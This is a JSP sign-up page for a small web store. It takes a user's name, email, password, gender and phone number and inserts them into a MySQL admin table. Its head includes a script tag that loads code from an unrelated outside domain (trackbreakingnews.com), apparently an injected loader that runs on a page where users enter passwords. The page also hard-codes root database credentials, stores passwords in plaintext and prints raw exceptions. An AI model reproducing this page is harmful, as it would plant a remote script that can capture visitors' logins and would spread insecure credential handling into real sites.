<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
 <%@ page import="java.sql.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Sign Up</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Front4.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>
</head>
<body>

<%
Connection con=null;
PreparedStatement ps=null;
String st=null;

		String nm=request.getParameter("fn");
		String nm1=request.getParameter("em");
		String nm2=request.getParameter("ps");
		String nm3=request.getParameter("gen");
		String nm4=request.getParameter("ph");
try 
{
	Class.forName("com.mysql.jdbc.Driver");
	con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
	st="insert into admin1 (fname,mail,pass,gen,fone,access_type) values(?,?,?,?,?,?)";
	ps=con.prepareStatement(st);
		ps.setString(1, nm);
		ps.setString(2, nm1);
		ps.setString(3, nm2);
		ps.setString(4,nm3);
		ps.setString(5, nm4);
		ps.setString(6, "2");
	int i=ps.executeUpdate();
	if(i>0) {
		out.println("<body> <h2>Done </h2></body>");
		request.getRequestDispatcher("Data1.jsp").forward(request, response);
		
	} else {
		out.println("Fill all Fields");
		request.getRequestDispatcher("User.jsp").include(request, response);
		
	}
}catch(Exception e) { out.println(e);}
%>


</body>
</html>
  <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>

</body>
</html>